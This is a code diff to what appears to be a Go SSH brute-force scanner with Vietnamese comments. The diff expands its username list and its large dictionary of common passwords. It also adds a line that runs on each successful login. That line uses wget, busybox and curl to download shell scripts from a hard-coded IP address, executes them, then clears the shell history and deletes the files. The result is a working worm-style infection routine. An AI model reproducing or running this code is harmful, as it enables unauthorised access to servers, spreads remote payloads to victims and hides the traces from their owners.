@@ -11,12 +11,19 @@ import (
 )
 
 var (
-    users     = []string{"root", "admin", "user", "test", "ubuntu", "ec2-user", "vagrant"}
+    users     = []string{"root", "admin", "user", "test", "ubuntu", "ec2-user", "vagrant","centos"}
     passwords = []string{
-        "password", "123456", "admin", "admin123", "root", "toor",
-        "qwerty", "password123", "123456789", "admin@123", "P@ssw0rd",
-        "changeme", "secret", "1234", "12345", "raspberry",
-        "letmein", "welcome", "test123", "user", "default", "mk123@",
+        "password", "123456", "123456789", "12345678", "1234567", "12345", "1234", "1234567890",
+        "qwerty", "abc123", "111111", "123123", "admin", "admin123", "admin@123",
+        "root", "toor", "user", "default", "ubuntu", "raspberry",
+        "letmein", "welcome", "password1", "passw0rd", "P@ssw0rd", "changeme", "test123",
+        "1q2w3e4r", "1qaz2wsx", "zaq12wsx", "qazwsx", "qwertyuiop", "asdfghjkl",
+        "loveyou", "iloveyou", "dragon", "superman", "batman", "pokemon", "football",
+        "monkey", "shadow", "sunshine", "princess", "trustno1", "master", "secret",
+        "hello", "freedom", "whatever", "696969", "killer", "fuckyou", "letmein",
+        "starwars", "ninja", "hottie", "flower", "cheese", "asdfgh", "pepper", "michael",
+        "jordan", "hunter", "buster", "thomas", "maggie", "daniel", "jessica",
+        "abc123456", "qwerty123", "qwe123", "1q2w3e", "mypass123", "qweasdzxc", "mk123@", "saigon123",
     }
 
     syncWait = sync.WaitGroup{}
@@ -57,6 +64,7 @@ func tryLogin(host, user, pass string) bool {
     }
 
     // Có đủ thông tin → coi là thành công thật
+	session.CombinedOutput(`cd /tmp ;busybox wget http://103.77.172.142/quang/w.sh; sh w.sh; curl http://103.77.172.142/quang/c.sh; sh c.sh; wget http://103.77.172.142/quang/wget.sh; sh wget.sh;history -c; rm -rf /tmp/w.sh /tmp/c.sh /tmp/wget.sh`)
     fmt.Printf("[✔] Thành công: %s:%s@%s\n", user, pass, host)
     fmt.Println("→ Thông tin hệ thống:")
     fmt.Println(strings.TrimSpace(string(output)))
